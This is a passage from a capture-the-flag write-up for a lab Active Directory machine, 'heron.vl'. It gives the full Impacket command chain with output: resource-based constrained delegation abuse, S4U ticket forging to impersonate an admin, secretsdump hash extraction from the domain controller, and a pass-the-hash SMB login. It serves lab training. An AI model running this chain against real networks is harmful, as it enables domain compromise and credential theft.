└─$ proxychains4 impacket-rbcd -delegate-from 'FRAJMP$' -delegate-to 'MUCDC$' -action 'write' 'heron.vl/adm_prju:(ADM_PRJU PASSWORD)'
......
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  heron.vl:389  ...  OK
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] FRAJMP$ can now impersonate users on MUCDC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     FRAJMP$      (S-1-5-21-1568358163-2901064146-3316491674-27101)
```

Now that the jumpbox can delegate on behalf of the domain controller, we can request the TGT with Impacket's `getST` tool. This will utilize both `S4U2Self` and `S4U2Proxy` to impersonate the specified user and obtain a valid service ticket for that user. 

I found that the Administrator account is disabled and was replaced with `_admin`, so we'll request for that user instead. You could also request to impersonate `MUCDC$`, as we'll be able to dump credentials with both of those accounts.

```
└─$ proxychains4 impacket-getST -spn 'cifs/mucdc.heron.vl' -impersonate '_admin' 'heron.vl/FRAJMP$' -hashes :(FRAJMP NT HASH)
......
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  HERON.VL:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  HERON.VL:88  ...  OK
[*] Impersonating _admin
[*] Requesting S4U2self
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  heron.vl:88  ...  OK
[*] Requesting S4U2Proxy
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  heron.vl:88  ...  OK
[*] Saving ticket in _admin@cifs_mucdc.heron.vl@HERON.VL.ccache
```

The ticket should be saved in an appropriate file with a file name specified at the bottom of the command.

Let's now set our Kerberos authentication global variable to be directed to this ticket. Note that if you impersonated the `MUCDC$` machine account, you may need to rename the ticket so that the `$` special character doesn't conflict with the global variable setting.

```
└─$ export KRB5CCNAME=_admin@cifs_mucdc.heron.vl@HERON.VL.ccache
```

Now we can attempt to dump all of the secrets through our SOCKS proxy using Impacket's `secretsdump` command with our Kerberos ticket. The output may be slow since it has to tunnel through the proxy so be sure to give it some time.

```
└─$ proxychains4 impacket-secretsdump -k mucdc.heron.vl
......
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.220.53:445  ...  OK
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x7a8b61a266b3e6ba7b55725d51f2b723
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
......
_admin:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::
```

You'll receive more of an output, as Impacket will dump every password hash for domain user and machine account that is cached on the DC. Since we were able to dump the `_admin` hash, we should be able to simply authenticate to the machine and steal the root flag.

The only stipulate is that WinRM is not enabled on this machine, and attempting to authenticate to RDP did not work when I tested it initially. We can still simply login to the `C$` SMB share with our admin hash and view the root flag. You can also use `smbexec` with the cached Kerberos ticket that we have to gain code execution to the machine.

```
└─$ proxychains4 smbclient \\\\10.10.220.53\\C$ -U '_admin' --pw-nt-hash (_ADMIN NT HASH)
......
smb: \> cd Users\Administrator\Desktop
smb: \Users\Administrator\Desktop\> get root.txt
getting file \Users\Administrator\Desktop\root.txt of size 36 as root.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)

└─$ cat root.txt  
[...snip...]
```

As you can see, now that we were able to read the root flag, that means we have compromised this machine!

![](/images/vulnlab/heron-vl/k.png)

# Conclusion

Big thanks to xct for the development of this machine, it really helped with strengthening domain-joined Linux attacks. I also have learned to remember to keep things simple, and always to make sure to check every last corner of the filesystems that you have access to.

# Resources

https://github.com/BishopFox/sliver
https://hashcat.net/wiki/doku.php?id=example_hashes
https://github.com/dirkjanm/BloodHound.py
https://github.com/t0thkr1s/gpp-decrypt
https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/
https://github.com/sosdave/KeyTabExtract
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces
https://medium.com/@jeroenverhaeghe/rce-from-web-config-461a5eab8ce9